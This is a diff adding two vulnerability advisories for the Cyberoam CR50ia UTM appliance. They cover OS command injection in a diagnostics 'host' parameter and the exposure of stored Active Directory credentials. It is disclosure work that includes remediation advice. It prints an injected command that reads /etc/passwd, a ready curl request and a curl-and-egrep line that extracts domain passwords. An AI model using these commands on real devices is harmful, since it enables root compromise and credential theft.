@@ -1,0 +1,99 @@
+SECURITY ADVISORY: cyberoam-utm-command-executaion
+Affected Software: Cyberoam CR50ia 10.01.0 build 678
+Vulnerability: OS Command Execution
+Severity: High
+Release Date: Unreleased
+
+
+I. Background
+~~~~~~~~~~~~~
+"Cyberoam Unified Threat Management appliances offer assured security, connectivity and productivity to Small Office-Home Office (SOHO) and Remote Office-Branch Office (ROBO) users by allowing user identity-based policy controls." [1]
+The Cyberoam UTM exposes a web interface through a Jetty web server and this winterface allows authenticated users to perform network diagnostic actions such as ping, traceroute, name lookup and so on.
+These actions are accessible to authenticated users, and are vulnerable to command injection attacks.
+
+II. Description
+~~~~~~~~~~~~~~~
+Vulnerble functionality lies under SYSTEM --> Diagnostics --> Tools.
+The Java Server page /corporate/Controller requires several parameters to the server when a user attempts to perform these diagnostic actions. The parameter 'host' is vulnerable to OS command injection. Some client-side validation is performed to check that the IP address provided is in valid format, however no such validation is performed on server-side. Hence, a malicious user can easily bypass client-sidevalidation checks by using an in-line proxy tool and inject an OS command.
+Legitimate input:
+__RequestType=ajax&mode=758&tool=1&interface=&host=127.0.0.1&pingipfqd
+n=127.0.0.1&size=&tracerouteipfqdn=&namelookupipfqdn=&dns=&routelookup
+ipfqdn=&pinginterface=&tracerouteinterface=&selectdns=10.0.0.5&
+Malicious input:
+__RequestType=ajax&mode=758&tool=1&interface=&host=127.0.0.1 -c 1;cat
+/etc/passwd&pingipfqdn=127.0.0.1&size=&tracerouteipfqdn=&namelookupipf
+qdn=&dns=&routelookupipfqdn=&pinginterface=&tracerouteinterface=&selec
+tdns=10.0.0.5&
+Test (replace cookie with a valid JSESSIONID):
+curl -d '__RequestType=ajax&mode=758&tool=1&interface=&host=127.0.0.1
+-c 1;cat /etc/passwd&pingipfqdn=127.0.0.1&size=&tracerouteipfqdn=&name
+lookupipfqdn=&dns=&routelookupipfqdn=&pinginterface=&tracerouteinterfa
+ce=&selectdns=10.0.0.5&' -b "JSESSIONID=u2ur76lhy4qt" -H "Referer: bla
+h" http://<webserver>/corporate/Controller
+The malicious input will trick the server into reading and displaying
+the contents of passed file in addition to pinging the target host. In
+a similar manner, other Linux OS commands can be executed. It was also
+possible to download a malicious binary from a remote web server, onto
+the appliance using the 'wget' utility.
+Commands are executed as the 'root' user.
+
+III. Impact
+~~~~~~~~~~~
+The vulnerability permits execution of OS commands by crafting malicious input. This may lead to complete compromise of the device and sensitive data it holds. The appliance uses MySQL and PostgreSQL databases to store data. By exploiting this vulnerability, it would be possible for an attacker to obtain database credentials from configuration files.
+If default passwords are not changed, then this represents an easy escalation to 'root' on a potentially privileged node on the network.
+
+IV. Remediation
+~~~~~~~~~~~~~~~
+Implement proper server-side input validation on the 'host' parameter and discard any inputs that don't strictly abide by IP address formats.
+
+V. Disclosure
+~~~~~~~~~~~~~
+Reported By: Saurabh Harit, SensePost
+Discovery Date: 2011-11-01
+~~~~~~~~~~~~~
+[1] http://www.cyberoamworks.com/Cyberoam-CR50ia.asp
+
+
+
+SECURITY ADVISORY: cyberoam-utm-insecure-password-handling
+Affected Software: Cyberoam CR50ia 10.01.0 build 678
+Vulnerability: Insecure Password Handling
+Severity: High
+Release Date: Unreleased
+
+
+I. Background
+~~~~~~~~~~~~~
+"Cyberoam Unified Threat Management appliances offer assured security, connectivity and productivity to Small Office-Home Office (SOHO) and Remote Office-Branch Office (ROBO) users by allowing user identity-based policy controls." [1]
+Cyberoam UTM integrates with Active Directory. In order to query data from a configured AD, domain credentials are stored within the device. These credentials are retrievable by an authenticated user.
+
+II. Description
+~~~~~~~~~~~~~~~
+Domain credentials are stored on the device and passed to web clients on a diagnostic page (Identity --> Authentication --> Authentication Server --> /Select Configured AD/ ). Authenticated clients can thus easily access stored credentials.
+A trivial check for this follows (replace cookie value):
+curl -s -b "JSESSIONID=u2ur76lhy4qt" -H "Referer: blah" "http://<webse
+rver>/corporate/webpages/identity/ActiveDirectoryEdit.jsp?__RequestTyp
+e=ajax&&objectID=1&pageid=pagePopupForm1"|egrep '(adminusername|passwd
+value)'
+
+III. Impact
+~~~~~~~~~~~
+The vulnerability allows a malicious user to access potentially privileged domain credentials. Should default passwords not be changed, then this is a trivial entry point onto a Windows domain.
+
+IV. Remediation
+~~~~~~~~~~~~~~~
+Do not return stored credentials to the browser.
+
+V. Disclosure
+~~~~~~~~~~~~~
+Reported By: Saurabh Harit, SensePost
+Discovery Date: 2011-11-01
+Vendor Informed: yyyy-mm-dd
+Advisory Release Date: yyyy-mm-dd
+Patch Release Date: yyyy-mm-dd
+Advisory Updated: yyyy-mm-dd
+
+
+VI. References
+~~~~~~~~~~~~~
+[1] http://www.cyberoamworks.com/Cyberoam-CR50ia.asp
